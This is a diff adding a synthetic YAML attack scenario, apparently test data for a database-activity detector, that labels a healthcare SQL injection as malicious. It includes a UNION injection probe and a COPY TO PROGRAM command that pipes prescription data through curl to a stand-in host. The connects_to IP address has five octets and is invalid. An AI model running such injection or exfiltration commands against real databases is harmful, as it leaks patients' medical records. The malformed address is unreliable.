@@ -1,0 +1,33 @@
+scenario_id: gen_healthcare_52_sql_injection_mal_1487m
+family_id: gen_healthcare_52_sql_injection_fam_1487
+domain: healthcare
+time_of_day: '23:05'
+default_class: malicious
+rule_engine_relationship: malicious_false_negative
+sessions:
+- session_label: inject
+  role: research_etl_service
+  anchor: db
+  timing:
+    tempo: steady
+    step_gaps_seconds:
+    - 8.0
+  events:
+  - step_id: probe
+    sql: SELECT appointment_id, status FROM appointments WHERE patient_id = 0 UNION
+      SELECT drug_name, dosage FROM prescriptions
+  - step_id: exfil
+    sql: COPY (SELECT drug_name, dosage FROM prescriptions) TO PROGRAM 'curl -sX POST
+      https://deid-partner.example/ingest -d @-'
+    connects_to:
+      ip: 141.98.11.216.130
+      port: 8443
+matched_pair_id: gen_healthcare_52_sql_injection_pair_1487
+matched_dimensions:
+  fixed:
+  - process_tree_shape
+  - syscall_sequence
+  - timing_pattern
+  - role
+  varied:
+  - sql_content
